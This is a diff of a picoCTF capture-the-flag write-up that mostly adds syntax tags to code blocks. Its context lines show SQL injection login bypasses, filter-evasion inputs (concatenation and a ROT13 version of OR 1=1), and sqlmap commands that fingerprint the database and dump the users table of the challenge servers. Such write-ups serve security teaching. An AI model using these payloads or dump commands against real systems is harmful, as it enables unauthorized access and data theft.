@@ -304,7 +304,7 @@ $(document).ready(function(){
 </html>
 ~~~
 
-We can login using any account.  The website does not seem to authenticate login details.  Afetr logging in we get the response:
+We can login using any account.  The website does not seem to authenticate login details.  After logging in we get the response:
 
 ~~~
 Success: You logged in! Not sure you'll be able to see the flag though. 
@@ -533,7 +533,7 @@ This shows us that the filter will block and OR statments submitted at index.php
 
 We can try test POST parameters in the login form with username=test and password=test we get a query string presented on index.php:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='test' AND password='test' 
 ~~~
 
@@ -545,7 +545,7 @@ We can enter into the form: username=admin'--, password=test.
 
 This provides the query string:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='admin'--' AND password='test' 
 ~~~
 
@@ -559,7 +559,7 @@ This filter will remove any "OR", "AND", "LIKE" "=" and "--" strings from our fo
 
 We can try using a comment block to break up the -- input, username=admin'-/*comment*/-, password=test however this does not work:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='admin'-/*break*/-' AND password='test' 
 ~~~
 
@@ -567,7 +567,7 @@ We get a html response: Invalid username/password.  Alternatively, we can stack 
 
 We get the following query string:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='admin';' AND password='test' 
 ~~~
 
@@ -579,7 +579,7 @@ Round3: or and = like > < --
 
 This is the same as before, but removes < and >.  We can try the same query as before, username=admin';, password=test:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='admin';' AND password='test' 
 ~~~
 
@@ -591,7 +591,7 @@ Round4: or and = like > < -- admin
 
 This is removing the same as before, but in addition the string "admin".  The injection sheet has a concatenation statement '||' we can use this to split the username and attempt to bypass the filter, username=adm'||'in';, password=test:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
 ~~~
 
@@ -603,7 +603,7 @@ Round5: or and = like > < -- union admin
 
 We can use the same form inputs as before, username=adm'||'in';, password=test:
 
-~~~
+~~~sql
 SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
 ~~~
 
@@ -707,13 +707,13 @@ This challenge suggests the flag is only available to picobrowser.  We therefore
 
 We can inspect the website to locate the flag at https://jupiter.challenges.picoctf.org/problem/28921/flag and use curl to retrieve the flag:
 
-~~~
+~~~shell
 $ curl -A "picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag | grep pico
 ~~~
 
 This returns:
 
-~~~
+~~~shell
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  2115  100  2115    0     0   2627      0 --:--:-- --:--:-- --:--:--  2627
@@ -882,7 +882,7 @@ The hints suggest that there is a backend database so this website is likely exp
 
 We can use [sqlmap](http://sqlmap.org/) to identify the database type and data fields:
 
-~~~
+~~~shell
 $ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
 ~~~
 
@@ -890,7 +890,7 @@ We pass the url using the "-u" flag.  "--forms" tells sqlmap that the SQL databa
 
 We get the following response:
 
-~~~
+~~~shell
          ___
        __H__                                                                 
  ___ ___[)]_____ ___ ___  {1.5.2#stable}                                     
@@ -936,25 +936,25 @@ back-end DBMS: active fingerprint: SQLite 3
 
 This response identifies the back-end database uses [SQLite 3](https://sqlite.org/version3.html):
 
-~~~
+~~~shell
 back-end DBMS: active fingerprint: SQLite 3
 ~~~
 
 and the web application uses [Nginx](https://www.nginx.com/):
 
-~~~
+~~~shell
 web application technology: Nginx
 ~~~
 
 Reviewing the [sqlmap man page](http://manpages.org/sqlmap), we can rerun the sqlmap with the flag --dbms=SQLite.  This forces the sqlmap detection techniques to use SQLite only and reduces the number of operations.  We can use a few further flags to expand our queries.  --threads=10 runs sqlmap with 10 multiple concurrent threads, --tables tells sqlmap to retrieve tables from the DB.  We also pass the flag --random-agent, this changes the HTTP User-Agent to a browser instead of sqlmap.
 
-~~~
+~~~shell
 $ sqlmap --dbms=SQLite --forms --batch --tables --random-agent --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html" 
 ~~~
 
 The response provides the following table users:
 
-~~~
+~~~shell
 <current>
 [1 table]
 +-------+
@@ -964,13 +964,13 @@ The response provides the following table users:
 
 We now know that the DB has a users table, in which the login details are likely held.  We can rerun sqlmap with the flag -T users, to focus on the users table.  Adding --dump, tells sqlmap to grab all of the data from the table:
 
-~~~
+~~~shell
 $ sqlmap --dbms=SQLite --forms --batch -T users --dump --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
 ~~~
 
 We get the following response:
 
-~~~
+~~~shell
 Database: <current>
 Table: users
 [1 entry]
@@ -1000,13 +1000,13 @@ We can attempt direct [SQLite 3 injection](http://atta.cked.me/home/sqlite3injec
 
 We can view the SQL query using curl:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=test&password=test&debug=1"
 ~~~
 
 We get a response:
 
-~~~
+~~~shell
 <pre>username: test
 password: test
 SQL query: SELECT * FROM users WHERE name='test' AND password='test'
@@ -1021,13 +1021,13 @@ SELECT * FROM users WHERE name='test' AND password='test'
 
 We know the username in the users table is admin, we can attempt a simple OR input into the password:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
 ~~~
 
 We get the response:
 
-~~~
+~~~shell
 <pre>username: admin
 password: ' OR 1=1--
 SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
@@ -1078,7 +1078,7 @@ There is a website running at https://jupiter.challenges.picoctf.org/problem/528
 
 Using sqlmap, we can identify the DBMS:
 
-~~~
+~~~shell
 $ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/52849/login.html"
 ~~~
 
@@ -1086,7 +1086,7 @@ This does not return any details of the DBMS.  We therefore cannot identify the 
 
 Assuming a similar users table used in the previous challenge, we can test the website with curl:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=test&password=test&debug=1"
 <pre>username: test
 password: test
@@ -1102,7 +1102,7 @@ SELECT * FROM users WHERE name='test' AND password='test'
 
 Attempting an OR statement on the password as in the previous challenge we get:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
 <pre>username: admin
 password: ' OR 1=1--
@@ -1112,7 +1112,7 @@ SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
 
 We can see SQLite is used. However we were unable to get in with the OR statement. We can try again, by entering a comment string into the username field:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin'--&password=test&debug=1"
 <pre>username: admin'--
 password: test
@@ -1164,7 +1164,7 @@ There is a secure website running at https://jupiter.challenges.picoctf.org/prob
 
 This is another SQL injection challenge.  Inspecting the login html page:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.html"
 ~~~
 
@@ -1213,7 +1213,7 @@ We get the html webpage:
 
 We can see the POST fields only pass the field "password" for aithentication in the SQL database.  We can query the login.php page:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=test&debug=1"
 <pre>password: test
 SQL query: SELECT * FROM admin where password = 'grfg'
@@ -1228,7 +1228,7 @@ SELECT * FROM admin where password = 'grfg'
 
 Attempting an OR injection, we cannot login:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' OR 1=1--&debug=1" 
 <pre>password: ' OR 1=1--
 SQL query: SELECT * FROM admin where password = '' BE 1=1--'
@@ -1237,7 +1237,7 @@ SQL query: SELECT * FROM admin where password = '' BE 1=1--'
 
 We can see the OR statement is replaced with BE but the integers and punctuation characters are unchanged.  This looks like a substitution cipher.  We can clarify the substitution with a long input:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&debug=1" 
 <pre>password: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
 SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
@@ -1246,7 +1246,7 @@ SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqr
 
 We can see letter inputs are changed by 13, which is reflective (A=N, N=A).  Taking this substituted alphabet as an input we should get a normal alphabet returned:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&debug=1"
 <pre>password: NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm
 SQL query: SELECT * FROM admin where password = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
@@ -1255,7 +1255,7 @@ SQL query: SELECT * FROM admin where password = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcde
 
 The OR statement is substituted by BE, we can enter a new password field using BE in place of OR:
 
-~~~
+~~~shell
 $ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' BE 1=1--test&debug=1"                                    
 <pre>password: ' BE 1=1--test
 SQL query: SELECT * FROM admin where password = '' OR 1=1--grfg'
@@ -1493,7 +1493,7 @@ for num in png_arr:
 
 This returns:
 
-~~~
+~~~shell
 In [1]: runfile('java_kiddie_1.py')
 Byte 137 found in scrambled array at [52, 80, 364, 405, 450, 653]
 Byte 80 found in scrambled array at [17, 275, 360, 411]
@@ -1593,7 +1593,7 @@ for i in range(0,len(png_arr),1):
 
 This returns:
 
-~~~py
+~~~shell
 PNG Index 0, value 137.
 1 Location found
 Locations = [80]
